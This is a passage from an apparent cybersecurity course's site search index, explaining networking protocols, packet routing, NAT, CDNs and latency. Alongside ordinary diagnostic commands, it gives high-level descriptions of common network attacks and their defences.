Issues"},{"location":"LECTURES/unit2/lesson2-2/#transport-layer-protocols","text":"","title":"Transport Layer Protocols"},{"location":"LECTURES/unit2/lesson2-2/#tcp-transmission-control-protocol","text":"TCP provides reliable, ordered delivery.","title":"TCP (Transmission Control Protocol)"},{"location":"LECTURES/unit2/lesson2-2/#three-way-handshake","text":"Connection establishment: 1. Client \u2192 Server: SYN (sequence = 1000) 2. Server \u2192 Client: SYN-ACK (sequence = 5000, ack = 1001) 3. Client \u2192 Server: ACK (sequence = 1001, ack = 5001) Connection established!","title":"Three-Way Handshake"},{"location":"LECTURES/unit2/lesson2-2/#tcp-header","text":"Key fields: - Source port (16 bits) - Destination port (16 bits) - Sequence number (32 bits): Track bytes sent - Acknowledgment number (32 bits): Track bytes received - Flags : SYN, ACK, FIN, RST, PSH, URG - Window size : Flow control - Checksum : Error detection","title":"TCP Header"},{"location":"LECTURES/unit2/lesson2-2/#tcp-flags","text":"SYN : Synchronize, start connection ACK : Acknowledge received data FIN : Finish, close connection gracefully RST : Reset, abrupt close (error) PSH : Push, send data immediately URG : Urgent, prioritize this data","title":"TCP Flags"},{"location":"LECTURES/unit2/lesson2-2/#connection-termination","text":"Four-way handshake: 1. Client \u2192 Server: FIN 2. Server \u2192 Client: ACK 3. Server \u2192 Client: FIN 4. Client \u2192 Server: ACK Connection closed!","title":"Connection Termination"},{"location":"LECTURES/unit2/lesson2-2/#tcp-security","text":"SYN Flood attack : Send many SYN packets, never complete handshake - Exhausts server's connection table - Prevention: SYN cookies, rate limiting TCP hijacking : Inject packets with correct sequence numbers - Man-in-the-middle attack - Prevention: Encryption (TLS) Reset attacks : Send RST packets to terminate connections - Prevention: Encryption","title":"TCP Security"},{"location":"LECTURES/unit2/lesson2-2/#udp-user-datagram-protocol","text":"UDP is connectionless and unreliable (by design).","title":"UDP (User Datagram Protocol)"},{"location":"LECTURES/unit2/lesson2-2/#udp-header","text":"Simpler than TCP: - Source port (16 bits) - Destination port (16 bits) - Length (16 bits) - Checksum (16 bits) No sequence numbers, acknowledgments, or retransmissions.","title":"UDP Header"},{"location":"LECTURES/unit2/lesson2-2/#when-to-use-udp","text":"Use cases: - DNS queries (single packet request/response) - Video streaming (dropped frames tolerable) - Online gaming (low latency critical) - VoIP (voice calls, some packet loss acceptable) - DHCP (network configuration) - SNMP (network monitoring) Advantages: - Lower overhead - Faster (no handshake) - Better for real-time applications Disadvantages: - No reliability guarantee - No flow control - No congestion control","title":"When to Use UDP"},{"location":"LECTURES/unit2/lesson2-2/#udp-security","text":"UDP Flood : Send massive amounts of UDP packets - DDoS attack - Prevention: Rate limiting, firewall rules Amplification attacks : Small UDP query \u2192 large response - DNS amplification (50x) - NTP amplification (200x) - Prevention: Configure servers to not respond to spoofed sources","title":"UDP Security"},{"location":"LECTURES/unit2/lesson2-2/#network-layer-protocols","text":"","title":"Network Layer Protocols"},{"location":"LECTURES/unit2/lesson2-2/#ip-internet-protocol","text":"IP handles addressing and routing.","title":"IP (Internet Protocol)"},{"location":"LECTURES/unit2/lesson2-2/#ipv4-packet-structure","text":"Header fields: - Version : 4 for IPv4 - Header length : Usually 20 bytes - TTL (Time To Live): Decrements at each hop, prevents loops - Protocol : TCP (6), UDP (17), ICMP (1) - Source IP : 32-bit address - Destination IP : 32-bit address - Checksum : Header integrity","title":"IPv4 Packet Structure"},{"location":"LECTURES/unit2/lesson2-2/#ipv4-address-classes-historical","text":"Class A : 0.0.0.0 to 127.255.255.255 (large networks) Class B : 128.0.0.0 to 191.255.255.255 (medium networks) Class C : 192.0.0.0 to 223.255.255.255 (small networks) Private ranges: - 10.0.0.0/8 (Class A) - 172.16.0.0/12 (Class B) - 192.168.0.0/16 (Class C) Special addresses: - 127.0.0.1: Loopback (localhost) - 0.0.0.0: Default route - 255.255.255.255: Broadcast","title":"IPv4 Address Classes (Historical)"},{"location":"LECTURES/unit2/lesson2-2/#ipv6","text":"Address format : Eight groups of four hexadecimal digits 2001:0db8:85a3:0000:0000:8a2e:0370:7334 Abbreviation rules: - Leading zeros can be omitted: 2001:db8:85a3:0:0:8a2e:370:7334 - Consecutive zeros can be replaced with :: (once only): 2001:db8:85a3::8a2e:370:7334 Special addresses: - ::1 - Loopback - :: - Unspecified - fe80::/10 - Link-local - ff00::/8 - Multicast Why IPv6? - IPv4 exhaustion (4.3 billion addresses not enough) - IPv6 provides 340 undecillion addresses - Better security (IPsec built-in) - Simplified header - No NAT needed","title":"IPv6"},{"location":"LECTURES/unit2/lesson2-2/#icmp-internet-control-message-protocol","text":"ICMP sends error messages and diagnostic information.","title":"ICMP (Internet Control Message Protocol)"},{"location":"LECTURES/unit2/lesson2-2/#common-icmp-types","text":"Echo Request (Type 8) : Ping request Echo Reply (Type 0) : Ping response Destination Unreachable (Type 3) : Can't reach destination Time Exceeded (Type 11) : TTL expired (used by traceroute) Redirect (Type 5) : Better route available","title":"Common ICMP Types"},{"location":"LECTURES/unit2/lesson2-2/#ping","text":"ping example.com # Sends Echo Request # Receives Echo Reply # Shows round-trip time (RTT) Security implications: - Network reconnaissance - ICMP tunneling (covert channel) - ICMP flooding (DoS) - Some networks block ICMP","title":"Ping"},{"location":"LECTURES/unit2/lesson2-2/#traceroute","text":"traceroute example.com # Sends packets with increasing TTL # Each router decrements TTL # When TTL=0, router sends ICMP Time Exceeded # Shows path to destination","title":"Traceroute"},{"location":"LECTURES/unit2/lesson2-2/#arp-address-resolution-protocol","text":"ARP maps IP addresses to MAC addresses on local network.","title":"ARP (Address Resolution Protocol)"},{"location":"LECTURES/unit2/lesson2-2/#how-arp-works","text":"Computer wants to send packet to 192.168.1.100 Checks ARP cache (known IP\u2192MAC mappings) If not cached, broadcasts ARP request: \"Who has 192.168.1.100? Tell 192.168.1.50\" Device with 192.168.1.100 responds: \"192.168.1.100 is at MAC aa:bb:cc:dd:ee:ff\" Requester caches this mapping Uses MAC address for actual communication","title":"How ARP Works"},{"location":"LECTURES/unit2/lesson2-2/#arp-commands","text":"# Show ARP cache arp -a ip neigh show # Delete ARP entry sudo arp -d 192.168.1.100 # Add static ARP entry sudo arp -s 192.168.1.100 aa:bb:cc:dd:ee:ff","title":"ARP Commands"},{"location":"LECTURES/unit2/lesson2-2/#arp-spoofingpoisoning","text":"Attack: 1. Attacker sends fake ARP responses 2. Claims attacker's MAC is gateway's IP 3. Victim sends traffic to attacker instead of gateway 4. Attacker forwards traffic (man-in-the-middle) Detection: - Duplicate IP addresses - Unexpected ARP replies - Changing MAC addresses for same IP Prevention: - Static ARP entries (impractical) - ARP inspection on switches - Network monitoring","title":"ARP Spoofing/Poisoning"},{"location":"LECTURES/unit2/lesson2-2/#putting-it-all-together","text":"","title":"Putting It All Together"},{"location":"LECTURES/unit2/lesson2-2/#example-loading-a-web-page","text":"Let's trace what happens when you visit https://example.com : DNS Resolution Query DNS server: \"What's the IP for example.com?\" Response: \"93.184.216.34\" ARP (if needed) \"What's the MAC address of my gateway?\" Gateway responds with its MAC TCP Handshake SYN to 93.184.216.34:443 SYN-ACK from server ACK from client TLS Handshake Client Hello (supported ciphers) Server Hello (chosen cipher, certificate) Key exchange Encrypted connection established HTTP Request GET / HTTP/1.1 Host: example.com HTTP Response 200 OK Content-Type: text/html HTML content Additional Resources Browser parses HTML Requests CSS, JavaScript, images Each resource: separate TCP connection (HTTP/1.1) or multiplexed (HTTP/2) Connection Close FIN/ACK exchange Or keep-alive for reuse","title":"Example: Loading a Web Page"},{"location":"LECTURES/unit2/lesson2-2/#security-at-each-layer","text":"Application Layer: - Input validation - Authentication - Encryption (HTTPS) Transport Layer: - Port filtering - SYN cookies - Rate limiting Network Layer: - IP filtering - Route filtering - Spoofing prevention Link Layer: - MAC filtering - ARP inspection - VLAN segmentation Defense in depth: Protect at multiple layers.","title":"Security at Each Layer"},{"location":"LECTURES/unit2/lesson2-2/#protocol-analysis-practice","text":"To understand protocols deeply: 1. Capture traffic with Wireshark 2. Examine packet structure 3. Follow protocol flows 4. Identify anomalies Suggested exercises: - Capture and analyze HTTP traffic - Observe TCP three-way handshake - Watch DNS resolution - Monitor ARP requests - Trace full web page load Understanding protocols is fundamental to: - Detecting attacks - Analyzing malware communication - Troubleshooting network issues - Designing secure systems In the next lessons, we'll apply this knowledge to identify and exploit protocol weaknesses, and then learn how to defend against those attacks.","title":"Protocol Analysis Practice"},{"location":"LECTURES/unit2/lesson2-3/","text":"How Data Travels Across the Internet You understand what the internet is and know the protocols. Now let's trace exactly how data gets from point A to point B. Understanding this journey is crucial for security\u2014attackers exploit every step along the way. The Journey of a Packet When you send data over the internet, it doesn't travel as one piece. It's broken into packets , each taking its own route to the destination. Packet Structure Think of a packet like a letter in an envelope within another envelope: \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 Frame Header (Ethernet) \u2502 \u2190 Layer 2 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 IP Header (Source/Dest IP) \u2502 \u2190 Layer 3 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 TCP/UDP Header (Ports, Sequence) \u2502 \u2190 Layer 4 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 Application Data (HTTP, DNS, etc) \u2502 \u2190 Layer 7 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 Frame Trailer (Checksum) \u2502 \u2190 Layer 2 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 Each layer adds its own header with information needed for that layer. Encapsulation Process Step 1 - Application Layer: You type \"example.com\" in browser - Browser creates HTTP GET request Step 2 - Transport Layer: TCP adds header - Source port: 54321 (random) - Destination port: 443 (HTTPS) - Sequence numbers - Flags (SYN, ACK, etc.) Step 3 - Network Layer: IP adds header - Source IP: Your IP (e.g., 192.168.1.100) - Destination IP: example.com's IP (93.184.216.34) - TTL: 64 hops - Protocol: TCP Step 4 - Data Link Layer: Ethernet adds header and trailer - Source MAC: Your computer's MAC - Destination MAC: Gateway's MAC (next hop) - Frame check sequence Now the packet is ready to travel! Local Network to Gateway Step 1: Determining the Route Your computer knows it needs to send packet to 93.184.216.34. Checks routing table: ip route show # Output: default via 192.168.1.1 dev eth0 192.168.1.0/24 dev eth0 scope link Translation: \"For anything not on local network (192.168.1.x), send to gateway at 192.168.1.1\" Step 2: ARP Resolution Computer needs gateway's MAC address. ARP Request (broadcast): Ethernet: ff:ff:ff:ff:ff:ff (broadcast) ARP: Who has 192.168.1.1? Tell 192.168.1.100 Gateway responds: ARP: 192.168.1.1 is at aa:bb:cc:dd:ee:ff Computer caches this in ARP table: arp -a # 192.168.1.1 (192.168.1.1) at aa:bb:cc:dd:ee:ff [ether] on eth0 Step 3: Sending to Gateway Packet sent with: - Destination MAC: Gateway (aa:bb:cc:dd:ee:ff) - Destination IP: example.com (93.184.216.34) Important distinction: - MAC address changes at each hop (Layer 2) - IP address stays same throughout journey (Layer 3) Through the Internet ISP's Network Gateway (your router) forwards to ISP: 1. Receives packet from your computer 2. Performs NAT (Network Address Translation) - Replaces your private IP (192.168.1.100) - With public IP assigned by ISP (e.g., 203.0.113.45) - Tracks this in NAT table to forward responses back 3. Forwards packet to ISP's network Why NAT? - IPv4 address exhaustion - Private IPs can't be routed on internet - Allows many devices to share one public IP - Adds layer of security (hiding internal network) Internet Backbone Packet travels through multiple routers: Each router: 1. Receives packet 2. Examines destination IP (93.184.216.34) 3. Consults routing table 4. Forwards to next hop 5. Decrements TTL by 1 TTL (Time To Live): - Prevents packets from looping forever - Starts at 64 (typical) - Each router decrements by 1 - If TTL reaches 0, packet dropped - Router sends ICMP \"Time Exceeded\" back to source Routing decisions based on: - Shortest path (fewest hops) - Fastest path (lowest latency) - Available bandwidth - Cost (some routes more expensive) - Current network conditions Internet Exchange Points (IXPs) IXPs are where networks meet: - Physical locations - ISPs, content providers, and networks interconnect - Exchange traffic directly (peering) - Reduce latency and cost Major IXPs: - DE-CIX (Frankfurt) - AMS-IX (Amsterdam) - LINX (London) - Various locations worldwide Peering agreements: - Settlement-free: Exchange traffic at no cost - Paid peering: One party pays the other - Transit: Pay a larger network to reach rest of internet Reaching the Destination Destination Network Packet arrives at example.com's network: 1. Enters through border router 2. Firewall examines packet - Source IP allowed? - Destination port 443 allowed? - Packet looks legitimate? 3. IDS/IPS monitors for threats 4. Load balancer distributes traffic - Multiple web servers behind load balancer - Balancer picks one based on algorithm (round-robin, least connections) Final Destination Server Packet reaches web server: 1. Network interface receives packet 2. De-encapsulation process (reverse of encapsulation) - Remove Ethernet header - Remove IP header - Remove TCP header - Extract HTTP request 3. Web server processes request 4. Generates HTTP response 5. Sends back to source (your computer) The Return Journey Response takes reverse path: 1. Web server sends to its gateway 2. Through destination's network 3. Through internet backbone 4. Through IXPs 5. To your ISP 6. To your gateway 7. Gateway performs reverse NAT - Looks up original internal IP (192.168.1.100) - Replaces destination IP 8. Forwards to your computer Asymmetric routing: - Outbound and inbound paths may differ - Internet routing is dynamic - Different paths can have different characteristics Packet Loss and Reliability Why Packets Get Lost Common causes: - Network congestion (buffers full) - Transmission errors (noise, interference) - Routing loops (rare, but possible) - TTL expiration - Firewall drops - Router failures TCP Reliability TCP ensures delivery: Sequence numbers: Client sends: Seq: 1000, Data: \"GET / HTTP/1.1\" (15 bytes) Server acknowledges: Ack: 1015 (expecting byte 1015 next) Retransmission: If no ACK received within timeout: 1. TCP assumes packet lost 2. Retransmits same data 3. Exponential backoff (wait longer each retry) Flow control: - Window size in TCP header - Receiver tells sender how much buffer space available - Prevents sender from overwhelming receiver Congestion control: - Sender detects network congestion (packet loss) - Slows transmission rate - Gradually increases if packets successfully delivered UDP - No Reliability UDP doesn't care: - No acknowledgments - No retransmissions - Application handles reliability if needed DNS example: - Send query via UDP - If no response, application resends - Simple and fast Latency and Performance Round-Trip Time (RTT) RTT: Time for packet to destination and back Measured by ping: ping example.com # 64 bytes from example.com: icmp_seq=1 ttl=56 time=15.2 ms Factors affecting RTT: - Physical distance (speed of light limit) - Number of hops (each router adds delay) - Network congestion - Processing at each hop Typical RTTs: - Local network: <1 ms - Same city: 1-10 ms - Same country: 10-50 ms - Different continents: 100-300 ms - Satellite: 500-700 ms Bandwidth vs. Latency Bandwidth: How much data can be sent (highway width) Latency: How fast data travels (speed limit) Analogy: - Bandwidth = pipe diameter - Latency = water pressure You need both: - High bandwidth, high latency: Large pipes, slow water (satellite) - Low bandwidth, low latency: Small pipes, fast water (local network) Traceroute Analysis Traceroute shows the path: traceroute example.com 1 192.168.1.1 (192.168.1.1) 1.234 ms 2 10.0.0.1 (10.0.0.1) 5.678 ms 3 isp-router.net (203.0.113.1) 10.123 ms 4 backbone.net (198.51.100.1) 15.456 ms 5 ix-router.net (198.51.100.2) 20.789 ms 6 dest-network.com (93.184.216.34) 25.012 ms Each line shows: - Hop number - Router hostname/IP - Round-trip time Security note: Traceroute reveals network topology - Attackers use it for reconnaissance - Some networks block ICMP to prevent this Content Delivery Networks (CDNs) The Problem Example: - User in Tokyo visits website hosted in New York - RTT: ~200 ms - Every resource (HTML, CSS, JS, images) requires round trips - Page load: slow The Solution: CDNs CDN caching: 1. Content replicated to edge servers worldwide 2. User's request routed to nearest edge server 3. Edge server returns cached content 4. Much lower latency How it works: # Without CDN User (Tokyo) \u2192 New York server (200 ms RTT) # With CDN User (Tokyo) \u2192 Tokyo edge server (5 ms RTT) Major CDNs: - Cloudflare - Akamai - Amazon CloudFront - Fastly - Google Cloud CDN CDN benefits: - Reduced latency - Reduced origin server load - DDoS protection - Geographic availability Security implications: - CDN sees all your traffic - Trust model changes - SSL/TLS termination at CDN - Additional attack surface Quality of Service (QoS) Prioritizing Traffic Not all traffic is equal: - Video call: needs low latency - File download: needs high bandwidth - Web browsing: needs both - Email: neither critical QoS mechanisms: Traffic classification: VoIP packets \u2192 High priority queue Streaming video \u2192 Medium priority queue File transfer \u2192 Low priority queue Implementation: - Routers examine packets - Classify by port, protocol, or application - Queue accordingly - Process high-priority first DSCP (Differentiated Services Code Point): - Field in IP header - Marks packet priority - Routers respect marking Multicast and Broadcast Unicast (Normal) One sender, one receiver: Client \u2192 Server Broadcast One sender, all receivers on network: Sender \u2192 Everyone on 192.168.1.0/24 Example: ARP requests Address: 255.255.255.255 Problem: Doesn't scale, creates noise Multicast One sender, multiple interested receivers: Video stream \u2192 Subscribers only Example: Live video streaming Addresses: 224.0.0.0 to 239.255.255.255 Protocol: IGMP (Internet Group Management Protocol) Efficiency: - Send once, received by many - Saves bandwidth - Used for streaming, conferencing Security Implications Packet Sniffing Any device on network segment can capture packets: - Promiscuous mode - See all unencrypted traffic - Passwords, cookies, data Protection: Encryption (HTTPS, VPN) Man-in-the-Middle Attacker intercepts traffic: 1. ARP spoofing (become gateway) 2. Route traffic through attacker 3. Forward to real destination 4. Victim and server unaware Protection: - ARP inspection - HTTPS (attacker can't decrypt) - Certificate pinning Route Hijacking (BGP Hijacking) Attacker announces false routes: - BGP (Border Gateway Protocol) controls internet routing - Malicious announcements redirect traffic - Traffic flows through attacker - Hard to detect Examples: - 2008: Pakistan Telecom hijacked YouTube - 2018: Amazon Route 53 DNS hijacked - Ongoing nation-state attacks Protection: - RPKI (Resource Public Key Infrastructure) - Monitoring BGP announcements - Redundant paths DDoS Amplification Attacker amplifies traffic: 1. Sends small requests with spoofed source (victim's IP) 2. Servers send large responses to victim 3. Victim overwhelmed Protocols vulnerable: - DNS (50x amplification) - NTP (200x amplification) - SSDP (30x amplification) - Memcached (10,000x+ amplification) Protection: - Rate limiting - Source validation - Filtering spoofed packets - DDoS mitigation services Practical Exercises 1. Trace Your Traffic # Capture packets sudo tcpdump -i eth0 -w capture.pcap # Visit a website curl http://example.com # Stop capture (Ctrl+C) # Analyze with Wireshark wireshark capture.pcap Observe: - DNS query and response - TCP three-way handshake - HTTP request and response - TCP teardown 2. Measure Latency # Ping local gateway ping 192.168.1.1 # Ping Google DNS ping 8.8.8.8 # Ping international server ping example.com # Compare RTTs 3. Trace Route traceroute example.com # Count hops # Identify ISP transitions # Note latency increases 4. Monitor Your Traffic # Install iftop sudo apt install iftop # Monitor bandwidth usage sudo iftop -i eth0 Key Takeaways Data travels as packets: - Broken into small pieces - Each routed independently - Reassembled at destination Each layer adds headers: - Encapsulation going out - De-encapsulation coming in Internet routing is dynamic: - Multiple paths possible - Routers make decisions hop-by-hop - BGP controls large-scale routing Security at every hop: - Local network (ARP spoofing) - Transit (packet sniffing) - Routing (BGP hijacking) - Destination (DDoS) Performance factors: - Physical distance - Number of hops - Network congestion - CDNs and caching Understanding this journey helps you: - Diagnose network issues - Identify attack points - Design secure systems - Optimize performance Every cybersecurity professional needs to understand how data flows\u2014it's the foundation for everything else we do.","title":"Lesson 2.3"},{"location":"LECTURES/unit2/lesson2-3/#how-data-travels-across-the-internet","text":"You understand what the internet is and know the protocols. Now let's trace exactly how data gets from point A to point B. Understanding this journey is crucial for security\u2014attackers exploit every step along the way.","title":"How Data Travels Across the Internet"},{"location":"LECTURES/unit2/lesson2-3/#the-journey-of-a-packet","text":"When you send data over the internet, it doesn't travel as one piece. It's broken into packets , each taking its own route to the destination.","title":"The Journey of a Packet"},{"location":"LECTURES/unit2/lesson2-3/#packet-structure","text":"Think of a packet like a letter in an envelope within another envelope: \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 Frame Header (Ethernet) \u2502 \u2190 Layer 2 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 IP Header (Source/Dest IP) \u2502 \u2190 Layer 3 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 TCP/UDP Header (Ports, Sequence) \u2502 \u2190 Layer 4 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 Application Data (HTTP, DNS, etc) \u2502 \u2190 Layer 7 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 Frame Trailer (Checksum) \u2502 \u2190 Layer 2 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 Each layer adds its own header with information needed for that layer.","title":"Packet Structure"},{"location":"LECTURES/unit2/lesson2-3/#encapsulation-process","text":"Step 1 - Application Layer: You type \"example.com\" in browser - Browser creates HTTP GET request Step 2 - Transport Layer: TCP adds header - Source port: 54321 (random) - Destination port: 443 (HTTPS) - Sequence numbers - Flags (SYN, ACK, etc.) Step 3 - Network Layer: IP adds header - Source IP: Your IP (e.g., 192.168.1.100) - Destination IP: example.com's IP (93.184.216.34) - TTL: 64 hops - Protocol: TCP Step 4 - Data Link Layer: Ethernet adds header and trailer - Source MAC: Your computer's MAC - Destination MAC: Gateway's MAC (next hop) - Frame check sequence Now the packet is ready to travel!","title":"Encapsulation Process"},{"location":"LECTURES/unit2/lesson2-3/#local-network-to-gateway","text":"","title":"Local Network to Gateway"},{"location":"LECTURES/unit2/lesson2-3/#step-1-determining-the-route","text":"Your computer knows it needs to send packet to 93.184.216.34. Checks routing table: ip route show # Output: default via 192.168.1.1 dev eth0 192.168.1.0/24 dev eth0 scope link Translation: \"For anything not on local network (192.168.1.x), send to gateway at 192.168.1.1\"","title":"Step 1: Determining the Route"},{"location":"LECTURES/unit2/lesson2-3/#step-2-arp-resolution","text":"Computer needs gateway's MAC address. ARP Request (broadcast): Ethernet: ff:ff:ff:ff:ff:ff (broadcast) ARP: Who has 192.168.1.1? Tell 192.168.1.100 Gateway responds: ARP: 192.168.1.1 is at aa:bb:cc:dd:ee:ff Computer caches this in ARP table: arp -a # 192.168.1.1 (192.168.1.1) at aa:bb:cc:dd:ee:ff [ether] on eth0","title":"Step 2: ARP Resolution"},{"location":"LECTURES/unit2/lesson2-3/#step-3-sending-to-gateway","text":"Packet sent with: - Destination MAC: Gateway (aa:bb:cc:dd:ee:ff) - Destination IP: example.com (93.184.216.34) Important distinction: - MAC address changes at each hop (Layer 2) - IP address stays same throughout journey (Layer 3)","title":"Step 3: Sending to Gateway"},{"location":"LECTURES/unit2/lesson2-3/#through-the-internet","text":"","title":"Through the Internet"},{"location":"LECTURES/unit2/lesson2-3/#isps-network","text":"Gateway (your router) forwards to ISP: 1. Receives packet from your computer 2. Performs NAT (Network Address Translation) - Replaces your private IP (192.168.1.100) - With public IP assigned by ISP (e.g., 203.0.113.45) - Tracks this in NAT table to forward responses back 3. Forwards packet to ISP's network Why NAT? - IPv4 address exhaustion - Private IPs can't be routed on internet - Allows many devices to share one public IP - Adds layer of security (hiding internal network)","title":"ISP's Network"},{"location":"LECTURES/unit2/lesson2-3/#internet-backbone","text":"Packet travels through multiple routers: Each router: 1. Receives packet 2. Examines destination IP (93.184.216.34) 3. Consults routing table 4. Forwards to next hop 5. Decrements TTL by 1 TTL (Time To Live): - Prevents packets from looping forever - Starts at 64 (typical) - Each router decrements by 1 - If TTL reaches 0, packet dropped - Router sends ICMP \"Time Exceeded\" back to source Routing decisions based on: - Shortest path (fewest hops) - Fastest path (lowest latency) - Available bandwidth - Cost (some routes more expensive) - Current network conditions","title":"Internet Backbone"},{"location":"LECTURES/unit2/lesson2-3/#internet-exchange-points-ixps","text":"IXPs are where networks meet: - Physical locations - ISPs, content providers, and networks interconnect - Exchange traffic directly (peering) - Reduce latency and cost Major IXPs: - DE-CIX (Frankfurt) - AMS-IX (Amsterdam) - LINX (London) - Various locations worldwide Peering agreements: - Settlement-free: Exchange traffic at no cost - Paid peering: One party pays the other - Transit: Pay a larger network to reach rest of internet","title":"Internet Exchange Points (IXPs)"},{"location":"LECTURES/unit2/lesson2-3/#reaching-the-destination","text":"","title":"Reaching the Destination"},{"location":"LECTURES/unit2/lesson2-3/#destination-network","text":"Packet arrives at example.com's network: 1. Enters through border router 2. Firewall examines packet - Source IP allowed? - Destination port 443 allowed? - Packet looks legitimate? 3. IDS/IPS monitors for threats 4. Load balancer distributes traffic - Multiple web servers behind load balancer - Balancer picks one based on algorithm (round-robin, least connections)","title":"Destination Network"},{"location":"LECTURES/unit2/lesson2-3/#final-destination-server","text":"Packet reaches web server: 1. Network interface receives packet 2. De-encapsulation process (reverse of encapsulation) - Remove Ethernet header - Remove IP header - Remove TCP header - Extract HTTP request 3. Web server processes request 4. Generates HTTP response 5. Sends back to source (your computer)","title":"Final Destination Server"},{"location":"LECTURES/unit2/lesson2-3/#the-return-journey","text":"Response takes reverse path: 1. Web server sends to its gateway 2. Through destination's network 3. Through internet backbone 4. Through IXPs 5. To your ISP 6. To your gateway 7. Gateway performs reverse NAT - Looks up original internal IP (192.168.1.100) - Replaces destination IP 8. Forwards to your computer Asymmetric routing: - Outbound and inbound paths may differ - Internet routing is dynamic - Different paths can have different characteristics","title":"The Return Journey"},{"location":"LECTURES/unit2/lesson2-3/#packet-loss-and-reliability","text":"","title":"Packet Loss and Reliability"},{"location":"LECTURES/unit2/lesson2-3/#why-packets-get-lost","text":"Common causes: - Network congestion (buffers full) - Transmission errors (noise, interference) - Routing loops (rare, but possible) - TTL expiration - Firewall drops - Router failures","title":"Why Packets Get Lost"},{"location":"LECTURES/unit2/lesson2-3/#tcp-reliability","text":"TCP ensures delivery: Sequence numbers: Client sends: Seq: 1000, Data: \"GET / HTTP/1.1\" (15 bytes) Server acknowledges: Ack: 1015 (expecting byte 1015 next) Retransmission: If no ACK received within timeout: 1. TCP assumes packet lost 2. Retransmits same data 3. Exponential backoff (wait longer each retry) Flow control: - Window size in TCP header - Receiver tells sender how much buffer space available - Prevents sender from overwhelming receiver Congestion control: - Sender detects network congestion (packet loss) - Slows transmission rate - Gradually increases if packets successfully delivered","title":"TCP Reliability"},{"location":"LECTURES/unit2/lesson2-3/#udp-no-reliability","text":"UDP doesn't care: - No acknowledgments - No retransmissions - Application handles reliability if needed DNS example: - Send query via UDP - If no response, application resends - Simple and fast","title":"UDP - No Reliability"},{"location":"LECTURES/unit2/lesson2-3/#latency-and-performance","text":"","title":"Latency and Performance"},{"location":"LECTURES/unit2/lesson2-3/#round-trip-time-rtt","text":"RTT: Time for packet to destination and back Measured by ping: ping example.com # 64 bytes from example.com: icmp_seq=1 ttl=56 time=15.2 ms Factors affecting RTT: - Physical distance (speed of light limit) - Number of hops (each router adds delay) - Network congestion - Processing at each hop Typical RTTs: - Local network: <1 ms - Same city: 1-10 ms - Same country: 10-50 ms - Different continents: 100-300 ms - Satellite: 500-700 ms","title":"Round-Trip Time (RTT)"},{"location":"LECTURES/unit2/lesson2-3/#bandwidth-vs-latency","text":"Bandwidth: How much data can be sent (highway width) Latency: How fast data travels (speed limit) Analogy: - Bandwidth = pipe diameter - Latency = water pressure You need both: - High bandwidth, high latency: Large pipes, slow water (satellite) - Low bandwidth, low latency: Small pipes, fast water (local network)","title":"Bandwidth vs. Latency"},{"location":"LECTURES/unit2/lesson2-3/#traceroute-analysis","text":"Traceroute shows the path: traceroute example.com 1 192.168.1.1 (192.168.1.1) 1.234 